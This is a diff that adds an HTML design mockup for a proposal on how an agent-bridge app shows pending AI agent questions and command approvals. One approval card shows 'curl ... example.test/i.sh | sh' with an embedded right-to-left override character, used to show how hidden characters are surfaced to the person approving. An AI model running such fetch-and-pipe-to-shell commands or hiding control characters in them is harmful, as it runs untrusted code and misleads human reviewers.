@@ -1,0 +1,183 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<title>Proposal #253: attention states</title>
+<script src="./support.js"></script>
+</head>
+<body>
+<x-dc>
+<helmet>
+<style>
+body{margin:0}
+button,input,textarea{font:inherit}
+</style>
+</helmet>
+<!-- A proposal, not the spec (docs/design/proposals/253-attention.md): every state the
+     recommended option has to draw, in the Windows and desktop PWA styling. The captions are the
+     board's, never the interface's. -->
+<div style="width: 1440px; height: 1100px; box-sizing: border-box; padding: 40px; background: {{t.shell}}; color: {{t.text}}; font-family: 'Segoe UI Variable Text', 'Segoe UI', system-ui, sans-serif; font-size: 14px; line-height: 20px; font-variant-numeric: tabular-nums; display: flex; flex-direction: column; gap: 28px; overflow: hidden">
+  <div>
+    <div style="font-family: 'Segoe UI Variable Display', 'Segoe UI', sans-serif; font-size: 28px; line-height: 36px; font-weight: 600">One row, one question · states</div>
+    <div style="color: {{t.text2}}; margin-top: 4px">Proposal for #253, option A. Navigation names the session; the conversation holds the question; Tools and the inspector point to it.</div>
+  </div>
+
+  <div style="display: grid; grid-template-columns: 300px 300px 1fr 330px; gap: 28px; align-items: start; flex: 1; min-height: 0">
+
+    <!-- 1. Needs you · N -->
+    <div style="display: flex; flex-direction: column; gap: 14px">
+      <div style="font-size: 12px; line-height: 16px; font-weight: 600; color: {{t.cap}}; text-transform: uppercase; letter-spacing: 0.06em">1 · Needs you · N</div>
+
+      <div style="font-size: 12px; color: {{t.text2}}">Off: every machine's count; the rows stay in your order</div>
+      <div style="background: {{t.layer}}; border: 1px solid {{t.stroke}}; border-radius: 8px; padding: 12px">
+        <button aria-pressed="false" aria-label="Needs you, 3 on every machine" style="width: 100%; height: 36px; display: flex; align-items: center; gap: 10px; padding: 0 12px; border-radius: 4px; border: 1px solid {{t.stroke2}}; background: transparent; color: {{t.text}}; font-size: 14px; text-align: left"><dc-import name="Glyph" kind="needs" theme="{{theme}}" size="16" hint-size="16px,16px"></dc-import><span style="flex: 1">Needs you&#160;· 3</span></button>
+      </div>
+
+      <div style="font-size: 12px; color: {{t.text2}}">On, with a machine chosen: the rest are a press away</div>
+      <div style="background: {{t.layer}}; border: 1px solid {{t.stroke}}; border-radius: 8px; overflow: hidden">
+        <div style="display: flex; gap: 20px; padding: 0 20px; border-bottom: 1px solid {{t.stroke}}">
+          <span style="height: 36px; line-height: 36px; color: {{t.text2}}">All</span>
+          <span style="position: relative; height: 36px; line-height: 36px; font-weight: 600">ULTRA<span style="position: absolute; left: 0; right: 0; bottom: -1px; height: 3px; border-radius: 2px; background: {{t.accent}}"></span></span>
+          <span style="height: 36px; line-height: 36px; color: {{t.text2}}">DEV-VM1</span>
+        </div>
+        <div style="padding: 12px">
+          <button aria-pressed="true" style="position: relative; width: 100%; height: 36px; display: flex; align-items: center; gap: 10px; padding: 0 12px; border-radius: 4px; border: 1px solid {{t.stroke2}}; background: {{t.sel}}; color: {{t.text}}; font-size: 14px; text-align: left"><span style="position: absolute; left: 0; top: 10px; width: 3px; height: 16px; border-radius: 2px; background: {{t.accent}}"></span><dc-import name="Glyph" kind="needs" theme="{{theme}}" size="16" hint-size="16px,16px"></dc-import><span style="flex: 1; font-weight: 600">Needs you&#160;· 3</span><span style="font-size: 12px; color: {{t.text2}}">1 on ULTRA</span></button>
+          <div style="display: flex; gap: 12px; padding: 10px 12px; margin-top: 4px"><span style="padding-top: 2px; display: flex"><dc-import name="Glyph" kind="needs" theme="{{theme}}" size="16" hint-size="16px,16px"></dc-import></span><div style="flex: 1; min-width: 0"><div style="display: flex"><span style="flex: 1">Ship 0.1.691 prerelease</span><span style="font-size: 12px; color: {{t.text2}}">2m</span></div><div style="font-size: 12px; line-height: 16px; color: {{t.amberText}}">Waiting on you</div></div></div>
+          <button style="margin: 4px 0 0 40px; height: 32px; padding: 0 12px; border-radius: 4px; border: 1px solid {{t.stroke2}}; background: {{t.subtle}}; color: {{t.text}}; font-size: 14px">2 more on other machines</button>
+        </div>
+      </div>
+
+      <div style="font-size: 12px; color: {{t.text2}}">On, all answered: a row stays put until you leave the filter</div>
+      <div style="background: {{t.layer}}; border: 1px solid {{t.stroke}}; border-radius: 8px; padding: 12px">
+        <button aria-pressed="true" style="position: relative; width: 100%; height: 36px; display: flex; align-items: center; gap: 10px; padding: 0 12px; border-radius: 4px; border: 1px solid {{t.stroke2}}; background: {{t.sel}}; color: {{t.text}}; font-size: 14px; text-align: left"><span style="position: absolute; left: 0; top: 10px; width: 3px; height: 16px; border-radius: 2px; background: {{t.accent}}"></span><dc-import name="Glyph" kind="idle" theme="{{theme}}" size="16" hint-size="16px,16px"></dc-import><span style="flex: 1; font-weight: 600">Needs you&#160;· 0</span></button>
+        <div style="display: flex; gap: 12px; padding: 10px 12px; margin-top: 4px"><span style="padding-top: 2px; display: flex"><dc-import name="Glyph" kind="working" theme="{{theme}}" size="16" hint-size="16px,16px"></dc-import></span><div style="flex: 1; min-width: 0"><div>Release notes for 0.1.691</div><div style="font-size: 12px; line-height: 16px; color: {{t.text2}}">Working&#160;· DEV-VM1</div></div></div>
+        <div style="padding: 4px 12px 0 40px; font-size: 12px; color: {{t.text2}}">Nothing else needs you</div>
+      </div>
+
+      <div style="font-size: 12px; color: {{t.text2}}">Nothing waiting, filter off: no toggle at all</div>
+      <div style="background: {{t.layer}}; border: 1px dashed {{t.stroke2}}; border-radius: 8px; padding: 12px 20px; font-size: 12px; font-weight: 600; color: {{t.text2}}">Pinned</div>
+    </div>
+
+    <!-- 2. Rows -->
+    <div style="display: flex; flex-direction: column; gap: 14px">
+      <div style="font-size: 12px; line-height: 16px; font-weight: 600; color: {{t.cap}}; text-transform: uppercase; letter-spacing: 0.06em">2 · One row per session</div>
+      <div style="background: {{t.layer}}; border: 1px solid {{t.stroke}}; border-radius: 8px; padding: 8px 12px; display: flex; flex-direction: column; gap: 2px">
+        <sc-for list="{{rows}}" as="row">
+        <div style="display: flex; gap: 12px; padding: 10px 12px">
+          <span style="padding-top: 2px; display: flex"><dc-import name="Glyph" kind="{{row.glyph}}" theme="{{theme}}" size="16" hint-size="16px,16px"></dc-import></span>
+          <div style="flex: 1; min-width: 0">
+            <div style="display: flex; gap: 8px"><span style="flex: 1; overflow: hidden; text-overflow: ellipsis; white-space: nowrap">{{row.title}}</span><span style="font-size: 12px; color: {{t.text2}}">{{row.age}}</span></div>
+            <div style="font-size: 12px; line-height: 16px; overflow: hidden; text-overflow: ellipsis; white-space: nowrap"><span style="color: {{row.statusColor}}">{{row.status}}</span><span style="color: {{t.text2}}">&#160;· {{row.machine}}</span></div>
+            <div style="font-size: 11px; line-height: 14px; color: {{t.cap}}; margin-top: 4px">{{row.caption}}</div>
+          </div>
+        </div>
+        </sc-for>
+      </div>
+      <div style="font-size: 12px; line-height: 18px; color: {{t.text2}}">A row never carries the question's words. Screen readers hear the row as today: "Release notes for 0.1.691, waiting on you, DEV-VM1".</div>
+    </div>
+
+    <!-- 3. The question, in the conversation -->
+    <div style="display: flex; flex-direction: column; gap: 14px; font-size: 15px; line-height: 24px">
+      <div style="font-size: 12px; line-height: 16px; font-weight: 600; color: {{t.cap}}; text-transform: uppercase; letter-spacing: 0.06em">3 · The one full question, in the conversation</div>
+
+      <div style="font-size: 12px; line-height: 16px; color: {{t.text2}}">An approval: Approve once only where the whole prompt is drawn as it runs</div>
+      <section style="border-radius: 8px; background: {{t.amberFill}}; border: 1px solid {{t.amberEdge}}; padding: 14px 18px; display: flex; flex-direction: column; gap: 8px">
+        <div style="display: flex; align-items: center; gap: 8px; font-size: 12px; line-height: 16px"><dc-import name="Glyph" kind="needs" theme="{{theme}}" size="16" hint-size="16px,16px"></dc-import><span style="font-weight: 600; color: {{t.amberHead}}">Main agent asks</span><span style="color: {{t.text2}}">2m</span></div>
+        <p style="margin: 0">Allow Copilot to run this command?</p>
+        <code style="display: block; padding: 6px 10px; border-radius: 4px; background: {{t.card}}; font-family: {{mono}}; font-size: 12px; line-height: 18px">git push origin release/0.1.691</code>
+        <div style="display: flex; gap: 8px"><button style="height: 32px; padding: 0 12px; border-radius: 4px; border: 1px solid {{t.accentEdge}}; background: {{t.accent}}; color: {{t.onAccent}}; font-size: 14px">Approve once</button><button style="height: 32px; padding: 0 12px; border-radius: 4px; border: 1px solid {{t.stroke2}}; background: {{t.card}}; color: {{t.text}}; font-size: 14px">Deny</button></div>
+      </section>
+
+      <div style="font-size: 12px; line-height: 16px; color: {{t.text2}}">A character not drawn where it runs: shown as an escape, in the order it runs</div>
+      <section style="border-radius: 8px; background: {{t.amberFill}}; border: 1px solid {{t.amberEdge}}; padding: 14px 18px; display: flex; flex-direction: column; gap: 8px">
+        <div style="display: flex; align-items: center; gap: 8px; font-size: 12px; line-height: 16px"><dc-import name="Glyph" kind="needs" theme="{{theme}}" size="16" hint-size="16px,16px"></dc-import><span style="font-weight: 600; color: {{t.amberHead}}">Main agent asks</span><span style="color: {{t.text2}}">1m</span></div>
+        <p style="margin: 0">Allow Copilot to run this command?</p>
+        <code style="display: block; padding: 6px 10px; border-radius: 4px; background: {{t.card}}; font-family: {{mono}}; font-size: 12px; line-height: 18px">curl -fsSL https://example.test/i.sh <span style="border: 1px solid {{t.dangerText}}; color: {{t.dangerText}}; border-radius: 3px; padding: 0 2px">\u202E</span> | sh</code>
+        <div style="display: flex; gap: 8px"><button style="height: 32px; padding: 0 12px; border-radius: 4px; border: 1px solid {{t.accentEdge}}; background: {{t.accent}}; color: {{t.onAccent}}; font-size: 14px">Approve once</button><button style="height: 32px; padding: 0 12px; border-radius: 4px; border: 1px solid {{t.stroke2}}; background: {{t.card}}; color: {{t.text}}; font-size: 14px">Deny</button></div>
+      </section>
+
+      <div style="font-size: 12px; line-height: 16px; color: {{t.text2}}">A delegate's question, only answerable at the machine: no controls</div>
+      <section style="border-radius: 8px; background: {{t.amberFill}}; border: 1px solid {{t.amberEdge}}; padding: 14px 18px; display: flex; flex-direction: column; gap: 6px">
+        <div style="display: flex; align-items: center; gap: 8px; font-size: 12px; line-height: 16px"><dc-import name="Glyph" kind="needs" theme="{{theme}}" size="16" hint-size="16px,16px"></dc-import><span style="font-weight: 600; color: {{t.amberHead}}">Delegate Check ubuntu CI asks</span><span style="color: {{t.text2}}">9m</span></div>
+        <p style="margin: 0">Can I drop the v8 theme shim from Theme.tsx?</p>
+        <div style="font-size: 14px; line-height: 20px; color: {{t.text2}}">Yes · No · Keep it until 0.2</div>
+        <div style="font-size: 14px; line-height: 20px; font-weight: 600; color: {{t.amberText}}">Answer at the machine&#160;· DEV-VM1</div>
+      </section>
+
+      <div style="font-size: 12px; line-height: 16px; color: {{t.text2}}">Resolved: kept across turns, quiet, with this device&#8217;s answer record (or &#8220;No longer waiting&#8221; with none)</div>
+      <section style="border-radius: 8px; border: 1px solid {{t.stroke2}}; padding: 14px 18px; display: flex; flex-direction: column; gap: 6px">
+        <div style="display: flex; align-items: center; gap: 8px; font-size: 12px; line-height: 16px; color: {{t.text2}}"><dc-import name="Glyph" kind="done" theme="{{theme}}" size="16" hint-size="16px,16px"></dc-import><span style="font-weight: 600; color: {{t.text}}">Main agent asked</span><span>4m</span></div>
+        <p style="margin: 0">Which channel should the 0.1.691 notes go to?</p>
+        <div style="font-size: 14px; line-height: 20px"><span style="color: {{t.text2}}">You answered</span>&#160;Pre-release only&#160;<span style="color: {{t.text2}}">· 1m</span></div>
+      </section>
+    </div>
+
+    <!-- 4. Tools and the inspector -->
+    <div style="display: flex; flex-direction: column; gap: 14px">
+      <div style="font-size: 12px; line-height: 16px; font-weight: 600; color: {{t.cap}}; text-transform: uppercase; letter-spacing: 0.06em">4 · Tools and the inspector point to it</div>
+      <div style="background: {{t.layer}}; border: 1px solid {{t.stroke}}; border-radius: 8px; padding: 16px 20px; display: flex; flex-direction: column; gap: 10px; font-size: 12px; line-height: 16px">
+        <div style="font-weight: 600; color: {{t.text2}}">Tools</div>
+        <div style="display: flex; gap: 8px"><span style="padding-top: 2px; display: flex"><dc-import name="Glyph" kind="needs" theme="{{theme}}" size="12" hint-size="12px,12px"></dc-import></span><span style="flex: 1"><span style="font-family: {{mono}}">ask_user</span>&#160;· <a href="#" style="color: {{t.link}}; text-decoration: none">Waiting on you</a></span><span style="color: {{t.text2}}">4m</span></div>
+        <div style="font-size: 11px; line-height: 14px; color: {{t.cap}}; margin: -6px 0 0 20px">Waiting: links to the question</div>
+        <div style="display: flex; gap: 8px"><span style="padding-top: 2px; display: flex"><dc-import name="Glyph" kind="done" theme="{{theme}}" size="12" hint-size="12px,12px"></dc-import></span><span style="flex: 1"><span style="font-family: {{mono}}">ask_user</span>&#160;· <a href="#" style="color: {{t.link}}; text-decoration: none">Done</a></span><span style="color: {{t.text2}}">12m</span></div>
+        <div style="font-size: 11px; line-height: 14px; color: {{t.cap}}; margin: -6px 0 0 20px">Ended: its reported status (Done, Failed), a link while the conversation holds the question</div>
+        <div style="display: flex; gap: 8px"><span style="padding-top: 2px; display: flex"><dc-import name="Glyph" kind="working" theme="{{theme}}" size="12" hint-size="12px,12px"></dc-import></span><span style="flex: 1"><span style="font-family: {{mono}}">powershell</span> <span style="font-family: {{mono}}; color: {{t.text2}}">git push origin release/0.1.691</span></span><span style="color: {{t.text2}}">2m</span></div>
+        <div style="font-size: 11px; line-height: 14px; color: {{t.cap}}; margin: -6px 0 0 20px">The call an approval holds keeps its summary: it is the action, not the question</div>
+        <div style="display: flex; gap: 8px"><span style="padding-top: 2px; display: flex"><dc-import name="Glyph" kind="done" theme="{{theme}}" size="12" hint-size="12px,12px"></dc-import></span><span style="flex: 1"><span style="font-family: {{mono}}">ask_user</span>&#160;· Done</span><span style="color: {{t.text2}}">1h</span></div>
+        <div style="margin-left: 20px; padding: 8px 10px; border-radius: 4px; background: {{t.subtle}}; font-family: {{mono}}; color: {{t.text2}}; white-space: pre-wrap">Which branch should I cut 0.1.690 from?</div>
+        <div style="font-size: 11px; line-height: 14px; color: {{t.cap}}; margin: -4px 0 0 20px">Show summary, from the row's menu: the host's 200-byte summary, closed by default</div>
+      </div>
+
+      <div style="background: {{t.layer}}; border: 1px solid {{t.stroke}}; border-radius: 8px; padding: 16px 20px; display: flex; flex-direction: column; gap: 8px">
+        <div style="font-size: 11px; line-height: 14px; color: {{t.text2}}">Delegate</div>
+        <div style="display: flex; align-items: center; gap: 8px"><dc-import name="Glyph" kind="needs" theme="{{theme}}" size="16" hint-size="16px,16px"></dc-import><span style="font-size: 16px; line-height: 22px; font-weight: 600">Check ubuntu CI</span></div>
+        <dl style="margin: 4px 0 0; display: grid; grid-template-columns: 72px 1fr; gap: 4px 12px; font-size: 12px; line-height: 16px">
+          <dt style="color: {{t.text2}}">Status</dt><dd style="margin: 0"><a href="#" style="color: {{t.link}}; text-decoration: none">Asks you</a>&#160;· answer at the machine</dd>
+          <dt style="color: {{t.text2}}">Model</dt><dd style="margin: 0">claude-haiku-5.5</dd>
+          <dt style="color: {{t.text2}}">Kind</dt><dd style="margin: 0">Background</dd>
+          <dt style="color: {{t.text2}}">ID</dt><dd style="margin: 0; font-family: {{mono}}">agent-7c02</dd>
+        </dl>
+        <div style="font-size: 11px; line-height: 14px; color: {{t.cap}}">The delegate's inspector links to the question; it never repeats it</div>
+      </div>
+
+      <div style="background: {{t.layer}}; border: 1px solid {{t.stroke}}; border-radius: 8px; padding: 14px 20px; display: flex; flex-direction: column; gap: 6px">
+        <div style="font-size: 11px; line-height: 14px; color: {{t.cap}}">Tray and badges: unchanged, the count of pending questions</div>
+        <div style="display: flex; align-items: center; gap: 10px; font-size: 12px"><span style="position: relative; width: 24px; height: 24px; border-radius: 4px; background: {{t.card}}; display: grid; place-items: center"><svg width="14" height="14" viewBox="0 0 48 48" aria-hidden="true"><circle cx="19" cy="28" r="9.5" fill="none" stroke="{{t.accent}}" stroke-width="4.5"></circle><circle cx="36" cy="12.6" r="6" fill="{{t.accent}}"></circle></svg><span style="position: absolute; right: -5px; top: -5px; min-width: 14px; height: 14px; border-radius: 7px; background: {{t.amber}}; color: {{t.amberInk}}; font-size: 10px; line-height: 14px; font-weight: 600; text-align: center">3</span></span><span style="color: {{t.text2}}">Agent Bridge · 3 need you</span></div>
+      </div>
+    </div>
+  </div>
+</div>
+</x-dc>
+<script type="text/x-dc" data-dc-script data-props='{"theme":{"editor":"enum","options":["dark","light"],"default":"dark"},"$preview":{"width":1440,"height":1100}}'>
+class Component extends DCLogic {
+  renderVals() {
+    const theme = this.props.theme === 'light' ? 'light' : 'dark';
+    const dark = {
+      shell: '#202326', layer: '#272A2E', card: '#2F3338', stroke: 'rgba(255,255,255,0.07)', stroke2: 'rgba(255,255,255,0.12)', subtle: 'rgba(255,255,255,0.05)', sel: 'rgba(255,255,255,0.07)',
+      text: '#FFFFFF', text2: 'rgba(255,255,255,0.72)', accent: '#2DD4BF', accentEdge: 'rgba(255,255,255,0.08)', onAccent: '#062621', link: '#5EE6D3',
+      amber: '#FFB224', amberInk: '#14100A', amberHead: '#FFB224', amberText: '#FFD27A', amberFill: 'rgba(255,178,36,0.1)', amberEdge: 'rgba(255,178,36,0.35)',
+      dangerText: '#FF9494', cap: '#E5398A'
+    };
+    const light = {
+      shell: '#EEF0F2', layer: '#F9F9F9', card: '#FFFFFF', stroke: 'rgba(0,0,0,0.07)', stroke2: 'rgba(0,0,0,0.12)', subtle: 'rgba(0,0,0,0.03)', sel: 'rgba(0,0,0,0.05)',
+      text: '#1A1A1A', text2: 'rgba(0,0,0,0.62)', accent: '#0B7A6E', accentEdge: 'rgba(0,0,0,0.1)', onAccent: '#FFFFFF', link: '#0B7A6E',
+      amber: '#B87700', amberInk: '#FFFFFF', amberHead: '#8F5300', amberText: '#7A4600', amberFill: '#FFF2D6', amberEdge: 'rgba(184,119,0,0.45)',
+      dangerText: '#C9302C', cap: '#C2185B'
+    };
+    const t = theme === 'light' ? light : dark;
+    const row = (title, glyph, status, machine, age, caption, needs = true) => ({ title, glyph, status, machine, age, caption, statusColor: needs ? t.amberText : t.text2 });
+    return {
+      theme, t, mono: "'Agent Bridge Mono', 'Cascadia Mono', ui-monospace, monospace",
+      rows: [
+        row('Release notes for 0.1.691', 'needs', 'Waiting on you', 'DEV-VM1', '4m', 'The session asks (§2.2 rule 1)'),
+        row('Fluent V8 to V9 migration', 'needs', 'Delegate Check ubuntu CI asks', 'DEV-VM1', '9m', 'A delegate asks (rule 2)'),
+        row('Rotate the relay key', 'needs', 'Waiting on you', 'ULTRA', '12m', 'answerAtMachine: the question says so, not the row'),
+        row('Port the hooks to Codex', 'needs', '2 questions waiting', 'ULTRA', '6m', 'If a host ever sends two: one row, counted twice'),
+        row('Release notes for 0.1.691', 'working', 'Working', 'DEV-VM1', 'now', 'Answered while the filter is on: stays put', false)
+      ]
+    };
+  }
+}
+</script>
+</body>
+</html>
